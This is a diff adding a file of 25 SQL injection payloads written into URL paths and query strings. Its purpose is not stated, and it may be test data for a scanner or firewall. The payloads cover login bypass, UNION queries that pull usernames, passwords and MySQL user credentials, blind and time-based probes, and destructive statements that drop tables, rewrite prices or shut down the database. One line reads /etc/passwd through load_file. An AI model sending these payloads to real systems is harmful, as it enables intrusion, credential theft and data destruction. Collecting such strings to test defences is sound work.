@@ -1,0 +1,25 @@
+/products?id=1' OR 1=1 --
+/login?user=' OR '1'='1' -- &pass=' OR '1'='1' --
+/api/v1/articles?id=1 UNION SELECT username, password FROM users --
+/items/search?q=test' AND 1=CONVERT(int, @@version) --
+/profile?id=5; DROP TABLE users; --
+/news?id=1' AND (SELECT 'a'='a') --
+/products?category=' UNION SELECT 1,2,3,4 --
+/api/v2/user/1' AND SLEEP(10) --
+/search?name=admin' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --
+/login.php?username=admin'--
+/api/v1/posts?author_id=1 UNION ALL SELECT NULL, NULL, CONCAT(user,0x3a,pass) FROM mysql.user --
+/items?id=123 OR 1=1
+/users/show?id=-1 UNION SELECT 1, 'admin', 'password', 4 --
+/get_product?id=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97 --
+/category.php?id=1'; UPDATE products SET price = 1 WHERE 1=1; --
+/api/v1/orders?id=1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns --
+/admin/login?user=a' or 1 --
+/forgot_password?email=' OR 'x'='x
+/products/filter?price=100; SHUTDOWN; --
+/api/v3/search?term=x' OR 'a'='a
+/user/messages?id=1' UNION SELECT 1,2,load_file('/etc/passwd') --
+/vouchers/apply?code=' OR '1'='1'#
+/api/check_stock?product_id=1 OR 1=1
+/items/list?sort=price; --'
+/articles.php?id=10' OR '1' LIKE '1
